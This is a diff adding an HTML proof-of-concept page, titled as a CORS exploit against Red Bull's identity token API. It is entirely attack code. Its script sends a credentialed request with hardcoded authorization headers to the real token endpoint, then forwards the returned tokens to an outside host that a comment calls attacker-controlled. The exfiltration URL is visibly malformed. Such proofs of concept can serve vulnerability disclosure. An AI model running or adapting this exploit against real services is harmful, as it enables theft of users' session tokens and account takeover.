@@ -1,0 +1,35 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <title>Red Bull CORS Exploit PoC</title>
+  </head>
+  <body>
+    <script>
+      // Trigger the vulnerable CORS request
+      fetch("https://uim.redbull.com/uim/api/token", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+          "Uim-Country": "IN",
+          "Uim-Language": "en",
+          "Uim-Fallback-Language": "en",
+          "Uim-I18n-Namespace": "main",
+          "Uim-I18n-Fallback-Namespace": "main",
+          "Authorization": "Basic NWIyY2UzMGJkOWEwYmYyODVhYzcwYzEwOm5vc2VjcmV0YXZhaWxhYmxl",
+          "X-Uim-Authorization": "Basic NWIyY2UzMGJkOWEwYmYyODVhYzcwYzEwOm5vc2VjcmV0YXZhaWxhYmxl",
+          "X-Uim-Sdk-Version": "6.1.0",
+          "Application-Id": "5b2ce30bd9a0bf285ac70c10",
+          "X-Uim-Correlationid": "cb42b1eb-6a75-4edb-826f-4ee1a42eada4"
+        },
+        body: "grant_type=password&scope=openid%20profile&username=test@example.com&password=Test1234@&nonce=1234567890"
+      })
+      .then(res => res.json())
+      .then(data => {
+        // Send tokens to attacker-controlled server
+        fetch("https://https://hunter-4321.github.io/cors-poc/log?token=" + JSON.stringify(data));
+      })
+      .catch(err => console.error(err));
+    </script>
+  </body>
+</html>
